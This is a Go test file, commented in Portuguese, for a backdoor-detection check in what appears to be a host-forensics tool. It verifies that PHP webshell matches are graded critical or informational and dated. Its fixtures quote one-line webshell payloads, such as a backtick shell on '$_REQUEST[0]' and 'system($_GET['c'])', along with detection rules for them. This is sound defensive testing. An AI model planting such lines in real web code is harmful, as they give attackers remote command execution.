package checks

import (
	"strings"
	"testing"

	"github.com/lex0c/aletheia/internal/check"
	"github.com/lex0c/aletheia/internal/facts"
)

// O caso real: o webshell do bootstrap.php sai CRÍTICO, nomeando o arquivo, e
// DATADO pelo mtime — é o que o recorte de janela usa para trazê-lo à tona.
func TestWebshellRealEhCriticoEDatado(t *testing.T) {
	f := &facts.Facts{CodigoSuspeito: []facts.CodigoSuspeito{{
		Path: "/data/local/www/app/bootstrap.php", Lang: "php",
		ModUTC: "2017-12-04T15:32:03Z",
		Matches: []facts.MatchDeCodigo{
			{Linha: 16, Tier: 2, Regra: "shell via crase sobre entrada de request",
				Trecho: "if(isset($_REQUEST[0])){echo `$_REQUEST[0]`;die;}"},
		},
	}}}
	r := codigoBackdoor.Run(codigoBackdoor, f, testEnv())
	if len(r.Findings) != 1 {
		t.Fatalf("achados = %v", r.Findings)
	}
	fd := r.Findings[0]
	if fd.Sev != check.SevCritical {
		t.Errorf("sink sobre entrada tem de ser crítico, veio %v", fd.Sev)
	}
	if fd.Subject != "/data/local/www/app/bootstrap.php" {
		t.Errorf("subject = %q", fd.Subject)
	}
	if fd.Quando != "2017-12-04T15:32:03Z" {
		t.Errorf("o achado precisa ser datado pelo mtime, veio %q", fd.Quando)
	}
	evid := strings.Join(fd.Evidence, " ")
	if !strings.Contains(evid, "$_REQUEST[0]") || !strings.Contains(evid, ":16") {
		t.Errorf("o trecho e a linha precisam sair para o operador ler: %v", fd.Evidence)
	}
}

// A fronteira que mantém o check usável: um match só TIER 1 (eval sem entrada)
// sai como AVISO, não crítico. Chamar todo eval de backdoor gastaria a confiança.
func TestTier1SaiComoObservacaoNaoCritico(t *testing.T) {
	f := &facts.Facts{CodigoSuspeito: []facts.CodigoSuspeito{{
		Path: "/srv/app/tpl.php", Lang: "php",
		Matches: []facts.MatchDeCodigo{
			{Linha: 3, Tier: 1, Regra: "eval presente", Trecho: "eval('return '.$expr.';');"},
		},
	}}}
	r := codigoBackdoor.Run(codigoBackdoor, f, testEnv())
	if len(r.Findings) != 1 || r.Findings[0].Sev != check.SevInfo {
		t.Fatalf("eval puro é observação (INFO), não crítico nem aviso: %v", r.Findings)
	}
}

// Um arquivo com TIER 1 e TIER 2 juntos é crítico: a severidade do arquivo é a
// do seu match mais forte.
func TestArquivoComOsDoisTiersEhCritico(t *testing.T) {
	f := &facts.Facts{CodigoSuspeito: []facts.CodigoSuspeito{{
		Path: "/var/www/x.php", Lang: "php",
		Matches: []facts.MatchDeCodigo{
			{Linha: 1, Tier: 1, Regra: "eval presente", Trecho: "eval($a);"},
			{Linha: 9, Tier: 2, Regra: "sink de execução sobre entrada de request", Trecho: "system($_GET['c']);"},
		},
	}}}
	r := codigoBackdoor.Run(codigoBackdoor, f, testEnv())
	if len(r.Findings) != 1 || r.Findings[0].Sev != check.SevCritical {
		t.Fatalf("o mais forte manda: %v", r.Findings)
	}
}

// Sem código suspeito, silêncio. E a lacuna da varredura (teto, tempo) é
// repassada — "não achei" não pode sair igual a "parei antes de olhar".
func TestSemCodigoSuspeitoCalaERepassaLacuna(t *testing.T) {
	f := &facts.Facts{PersistDenied: map[string][]string{
		"codigo": {"a varredura de código parou em 20000 diretórios: o excedente NÃO foi analisado"},
	}}
	r := codigoBackdoor.Run(codigoBackdoor, f, testEnv())
	if len(r.Findings) != 0 {
		t.Errorf("host sem match não gera achado: %v", r.Findings)
	}
	if len(r.Partial) == 0 {
		t.Error("a lacuna da varredura precisa chegar à cobertura")
	}
}
